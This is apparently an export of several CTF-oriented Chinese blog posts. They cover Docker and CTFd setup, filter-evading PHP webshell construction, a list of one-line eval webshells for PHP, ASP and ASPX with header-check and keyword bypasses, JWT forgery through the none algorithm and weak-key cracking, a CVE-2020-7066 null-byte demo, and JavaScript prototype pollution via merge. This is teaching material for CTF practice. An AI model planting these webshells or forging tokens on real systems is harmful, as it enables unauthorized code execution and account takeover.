    <content><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>阿里云Ubantu-18.04<br>因为通过官方源下载太慢了，这里使用阿里云的镜像<br>添加阿里云镜像源<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><br>在里面添加下列源<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><br>保存后更新源<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><br>安装必要工具<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure></p>
<h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>安装gpe证书<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><br>写入软件源<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br></pre></td></tr></table></figure><br>更新源<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y update</span><br></pre></td></tr></table></figure><br>安装最新docker<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><br>查看docker版本<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-cache madison docker-ce</span><br></pre></td></tr></table></figure><br>安装指定版本的docker(命令末尾就是选择安装的版本)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce=18.06.0~ce~3-0~ubuntu</span><br></pre></td></tr></table></figure><br>查看docker版本来检查是否安装成功<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure></p>
<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>修改目录权限<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><br>检查版本来验证安装是否成功<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure></p>
<h3 id="搭建CTFd平台"><a href="#搭建CTFd平台" class="headerlink" title="搭建CTFd平台"></a>搭建CTFd平台</h3><p>下载CTFd<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git</span><br></pre></td></tr></table></figure><br>下载完后切换到CTFd目录下，运行安装<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><br>这里会比较慢，可以先去干别的。如果等不急可以先退出，下次进来再执行上一条命令就行了，它会接着上次的地方继续安装<br>安装完成后可用如下命令查看运行的容器<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><br>如果在运行，就可通过<a href="http://ip:8000来访问了">http://ip:8000来访问了</a><br>如果想要停止运行平台可执行如下命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure><br>继续运行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>特殊webshell</title>
    <url>/post/479d366b.html</url>
    <content><![CDATA[<p><a href="https://zxfireworks.xyz/post/e9141edc.html#SUCTF-2019-EasyWeb" target="_blank" rel="noopener">https://zxfireworks.xyz/post/e9141edc.html#SUCTF-2019-EasyWeb</a><br>做完上面这道题后，感觉有必要来学习总结一下一些特殊的webshell</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>利用位运算符’~’对字符串进行取反操作<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = urlencode(~(<span class="string">'$_GET&#123;phpinfo&#125;()'</span>));</span><br><span class="line">// %DB%A0%B8%BA%AB%84%8F%97%8F%96%91%99%90%82%D7%D6</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'?a=(~'</span>.<span class="variable">$a</span>.<span class="string">')'</span>;</span><br><span class="line">// ?a=(~%DB%A0%B8%BA%AB%84%8F%97%8F%96%91%99%90%82%D7%D6)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>还可利用UTF-8编码的汉字来构造字母<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> ~(<span class="string">"和"</span>&#123;2&#125;);//m</span><br><span class="line"><span class="built_in">echo</span> ~(<span class="string">"和"</span>&#123;2&#125;);//s</span><br><span class="line"><span class="built_in">echo</span> ~(<span class="string">"的"</span>&#123;1&#125;);//e</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>在PHP中，两个字符异或之后结果还是一个字符，如果题目中过滤了数字或字母，可用非数字或字母字符进行异或来构造需要的字母或数字<br>在PHP中，两个字符进行异或时，会将字符转换成ASCII值，再将ASCII值转换为二进制，然后对二进制进行异或，异或完后，将得到的二进制转换为ASCII值，再将ASCII值转换为字符<br>构造方法如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$l</span> = <span class="string">""</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">""</span>;</span><br><span class="line"><span class="variable">$argv</span> = str_split(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;count(<span class="variable">$argv</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;255;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(255);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">        	<span class="keyword">if</span>(<span class="variable">$j</span>&lt;16)&#123;</span><br><span class="line">        		<span class="variable">$l</span> .= <span class="string">"%ff"</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">"%0"</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">        		<span class="built_in">continue</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">"%ff"</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">"%"</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">            <span class="built_in">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&#123;'</span>.<span class="variable">$l</span>.<span class="string">'^'</span>.<span class="variable">$r</span>.<span class="string">'&#125;'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">//&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;</span><br></pre></td></tr></table></figure><br>如果想通过构造$_GET{x}();x=phpinfo这样的方式调用函数，可用上述方法来实现<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;</span>&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure></p>
<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>PHP是弱类型语言，可以不预先声明变量的类型，而直接声明一个变量并对其初始化操作。可利用该特点对PHP的变量类型进行隐式转换，如整形转换为字符串，或将字符串当作函数来处理<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">W</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"w1ndy"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>++;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">'&#125;'</span>^<span class="string">'*'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==1)&#123;</span><br><span class="line">    <span class="variable">$b</span>();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>该代码执行结果为打印出字符串w1ndy<br>代码分析：<br>$a++:对变量名为’a’的变量进行自增操作，在PHP中未定义的变量默认值为null==false==0,自增后就变为1了。当ban了所有数字时可用该方法间接得到一个数字<br>$b=’}’^’*‘:将字符’}’和’*‘进行异或操作，结果为’W’,并赋值给变量b<br>$b():此时的$b的值为W,所以在这也就是W(),因为PHP是动态代码执行的，所以这里字符串会被认为是函数W,进而执行W函数的代码</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>一句话木马</title>
    <url>/post/b7e0f698.html</url>
    <content><![CDATA[<p>总结一下常用的一句话木马,’@’这个符号是为了屏蔽报错</p>
<h3 id="PHP-eval用法和assert一样"><a href="#PHP-eval用法和assert一样" class="headerlink" title="PHP(eval用法和assert一样)"></a>PHP(eval用法和assert一样)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure>
<p>绕过文件头检测<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure><br>过滤了”&lt;?”,利用js调用php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>过滤了”php”,短标签绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?= @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">"pass"</span>]);?&gt;</span><br></pre></td></tr></table></figure><br>一些关键被过滤，可考虑以下绕过办法<br>0x00:php变量函数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">"assert"</span>;<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure><br>0x01:php可变变量<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">"assert"</span>;<span class="variable">$b</span>=<span class="string">'a'</span>;$<span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>])?&gt;</span><br></pre></td></tr></table></figure><br>0x02:str_replace函数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=str_replace(<span class="string">"1"</span>,<span class="string">""</span>,<span class="string">"a1s1s1e1r1t"</span>);<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure><br>0x03:base64_decode函数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=base64_decode(<span class="string">"YXNzZXJ0"</span>);<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure><br>0x04:使用’.’连接符<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">"ass"</span>;<span class="variable">$b</span>=<span class="string">"ert"</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">"pass"</span>)%&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%execute request(<span class="string">"pass"</span>)%&gt;</span><br></pre></td></tr></table></figure>
<h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt; &lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>JWT伪造</title>
    <url>/post/149e3f20.html</url>
    <content><![CDATA[<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<h3 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
<p>上面是一个JWT的例子，可以看出由’.’可以分割为三部分，分别是头部(header)、载荷(payload)、签名(signature)。其中header和payload都是必须经过base64编码的，signature是否base64编码是可选的</p>
<h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4><p>header部分是一个JSON对象，描述JWT的元数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;</span><br></pre></td></tr></table></figure><br>alg:签名算法，默认是HMAC SHA256(HS256),常用的还有RSA SHA256(RS256)<br>typ:声明这个token的类型，JWT令牌统一写为JTW<br>kid:是密钥key的id，密钥的具体值在数据库中<br>最后对上面的JSON对象base64编码</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>payload部分也是一个JSON对象，但是它是用来存放实际的数据的，但不要存放重要的秘密的数据，有7个官方字段可供选用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iss(issuer):签发人</span><br><span class="line">exp(expiration time):过期时间</span><br><span class="line">sub(subject):主题</span><br><span class="line">aud(audience):受众</span><br><span class="line">nbf(Not Before):生效时间</span><br><span class="line">iat(Issued At):签发时间</span><br><span class="line">jti(JWT ID):编号</span><br></pre></td></tr></table></figure><br>当然，除了这7个官方字段，还可以定义私有字段,例如:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"w1ndy"</span></span><br><span class="line">    <span class="string">"admin"</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>该对象也需要base64编码</p>
<h4 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h4><p>该部分是对前两部分的签名，防止数据被篡改<br>首先需要一个密钥(secret),这个密钥只有服务器才知道，不能泄露给用户。然后使用在header里指定的签名算法，按照以下公式产生签名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header)+<span class="string">"."</span>+base64UrlEncode(payload),secret)</span><br></pre></td></tr></table></figure></p>
<h3 id="JWT特点"><a href="#JWT特点" class="headerlink" title="JWT特点"></a>JWT特点</h3><p>0x00:默认不加密，但也可以加密。生成原始token后可以使用密钥加密一次<br>0x01:不加密情况下不能将秘密数据写入JWT<br>0x02:由于服务器不保存session状态，因此无法在使用过程中废止某个token，或者更改某个token的权限<br>0x03:JWT本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限</p>
<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>0x00:修改算法为none<br>0x01:敏感信息泄露。因为payload中的数据是明文传输的，如果存在敏感信息的话就会发生信息泄露<br>0x02:修改算法从RS256到HS256<br>0x03:弱key爆破</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h4><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CTFhub/JWT/wqm/wqm0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CTFhub/JWT/wqm/wqm1.jpg" alt=""><br>将alg加密算法改为none,同时将角色改为admin<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"typ"</span>:<span class="string">"JWT"</span>,<span class="string">"alg"</span>:<span class="string">"none"</span>&#125; : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,<span class="string">"role"</span>:<span class="string">"admin"</span>&#125; :</span><br><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ==</span><br></pre></td></tr></table></figure><br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ.</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CTFhub/JWT/wqm/wqm2.jpg" alt=""></p>
<h4 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h4><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CTFhub/JWT/rmy/rmy0.jpg" alt=""><br>利用工具爆破密钥，这里我用的是CrackJWTKey,gitHub可以下载，自己生成个字典跑一下，很快就跑出来了，密钥是<br>gnoa,使用方法如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CrackJWT.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.xLegwpl7myvfQFdpuddxjm97-yT5UbqZHiB6VG1yJ24 pass.txt</span><br></pre></td></tr></table></figure><br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ.47dYGTcMvN0aSIM8wwxOcPRuLHtoBvSFkKsmSp51tfA</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CTFhub/JWT/rmy/rmy1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CTFhub/JWT/rmy/rmy2.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2020-7066</title>
    <url>/post/4925bbe8.html</url>
    <content><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>get_headers()是PHP系统级函数，他返回一个包含有服务器响应一个HTTP请求所发送的标头的数组。如果失败则返回 FALSE 并发出一条 E_WARNING 级别的错误信息(可用来判断远程文件是否存在)。<br>array get_headers(string $url,int $format=0)<br>url为目标的URL,format是可选参数，默认为0，如果设置为1，则get_headers()会解析成相应的信息并设定数组的键名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span>=<span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">print_r(get_headers(<span class="variable">$url</span>));</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">print_r(get_headers(<span class="variable">$url</span>,1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CVE-2020-7066/CVE20207066_0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CVE-2020-7066/CVE20207066_1.jpg" alt=""><br>get_headers()函数会截断URL中空字符后的内容<br>存在版本：7.2.x(低于7.2.29)、7.3.x(低于7.3.16)、7.4.x(低于7.4.4)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'url'</span>] =<span class="string">"https://www.baidu.com\0.haha.com"</span>; </span><br><span class="line"><span class="variable">$host</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">'url'</span>], PHP_URL_HOST);    // 解析URL并返回其组成部分</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$host</span>, -9) !==<span class="string">'.haha.com'</span>)&#123; </span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$headers</span> = get_headers(<span class="variable">$_GET</span>[<span class="string">'url'</span>]); </span><br><span class="line">var_dump (<span class="variable">$headers</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CVE-2020-7066/CVE-2020-7066_2.jpg" alt=""><br>可以看到<a href="https://www.baidu.com\0.haha.com" target="_blank" rel="noopener">https://www.baidu.com\0.haha.com</a> 最终被解析成了 <a href="https://www.baidu.com，" target="_blank" rel="noopener">https://www.baidu.com，</a> 从\0处截断了</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p><a href=https://zxfireworks.xyz/2020/03/14/BUUCTF-Web>[GKCTF2020]cve版签到</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript原型链污染</title>
    <url>/post/5d5d07b8.html</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1At411t7Lu?from=search&seid=11463946534016996399" target="_blank" rel="noopener">JS中的原型和原型链</a></p>
<h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><p>在JavaScript中，每个函数都有一个默认原型属性，也就是prototype，在使用该构造函数实例化对象时就会继承该原型中的属性和方法。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> Persion(name,age) &#123;</span><br><span class="line">        this.name=<span class="string">"w1ndy"</span>;</span><br><span class="line">        this.age=20;</span><br><span class="line">    &#125;</span><br><span class="line">    var p1=new Persion();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js0.jpg" alt=""><br>这里对象p1继承了Persion的原型的属性myfunc<br>在javascript中的继承不同于面向对象编程中的继承，在javascript中是通过原型链__proto__来实现继承的</p>
<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js1.jpg" alt=""><br>对于Persion来说要访问它的原型，用Persion.prototype就可。但是用Persion实例化出来的对象p1无法通过该方法来访问原型，需要通过p1.__proto<strong>来访问Persion的原型,从图中结果可以得出结论<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Persion.prototype===p1.__proto__</span><br></pre></td></tr></table></figure><br>在对象p1中本身是没有myfunc的，那它是怎么找到该属性的呢，其实就是通过__proto</strong>原型链来找的，也就是说先在自己身上找，如果找不到就向上访问它的原型链，在其原型链上继续找，如果还是找不到，继续向上，直到找到或者找到Object还是没找到就结束<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js2.jpg" alt=""><br>我在Object中添加了一个属性objfunc,当使用p1.objfunc时，他会先在自身找，发现找不到，然后通过p1.__proto<strong>来在Persion上找，发现还是没找到，继续在Persion的原型链上找，也就是通过p1.__proto</strong>.__proto__在Object上找，然后就找到了objfunc<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js3.jpg" alt=""><br>每个原型都有一个constructor属性，它是指向关联的构造函数<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js4.jpg" alt=""><br>构造函数、原型、实例对象之间关系如下图所示<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js5.jpg" alt=""></p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js6.jpg" alt=""><br>在上述例子中，a有一个len属性，b是空的，此时b访问len属性是访问不到的;执行a.__proto<strong>.len=2之后，b就能访问到len属性了;<br>原因如下：<br>a.__proto</strong>.len=2修改的是a的原型的属性，即Object的属性，而b的原型也是Object,从而b也能访问到len属性；如果能够控制并修改一个对象的原型，这将会影响所有和这个对象来自同一个类或祖父类的对象，这种攻击方式就是原型链污染。<br>原型链污染的发现场景：</p>
<h4 id="对象merge"><a href="#对象merge" class="headerlink" title="对象merge"></a>对象merge</h4><p>需要控制一个键值对<br>将<strong>proto</strong>解析为键名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> merge(target,<span class="built_in">source</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">let</span> key <span class="keyword">in</span> <span class="built_in">source</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> target &amp;&amp; key <span class="keyword">in</span> <span class="built_in">source</span>)&#123;</span><br><span class="line">            merge(target[key],<span class="built_in">source</span>[key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key]=<span class="built_in">source</span>[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js8.jpg" alt=""><br>c.n2返回undefined，说明没有污染成功，这是因为这里的__proto<strong>没有被解析为一个键名，而是被当作b的原型，所以需要使用JSON.parse()将\</strong>proto__解析为键名才能污染原型链。<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/jsProto/js7.jpg" alt=""><br>c.n2=2,污染成功了</p>
